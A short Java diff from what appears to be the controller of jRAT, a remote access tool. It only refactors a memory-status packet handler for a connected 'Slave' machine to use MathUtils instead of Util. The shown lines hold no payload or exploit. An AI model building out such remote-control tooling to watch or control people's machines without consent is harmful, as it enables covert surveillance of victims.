@@ -3,9 +3,9 @@ package pro.jrat.packets.incoming;
 import java.io.DataInputStream;
 
 import pro.jrat.Slave;
+import pro.jrat.common.utils.MathUtils;
 import pro.jrat.ui.frames.FrameControlPanel;
 import pro.jrat.ui.panels.PanelControlSystemMonitor;
-import pro.jrat.utils.Util;
 
 
 public class Packet24JVMMemory extends AbstractIncomingPacket {
@@ -28,7 +28,7 @@ public class Packet24JVMMemory extends AbstractIncomingPacket {
 					
 					panel.panelRAM.paintComponent(panel.panelRAM.getGraphics());
 				}
-				panel.barRAM.setValue(Util.getPercentFromTotal((int) MB, (int) MAX));
+				panel.barRAM.setValue(MathUtils.getPercentFromTotal((int) MB, (int) MAX));
 			}			
 		}
 
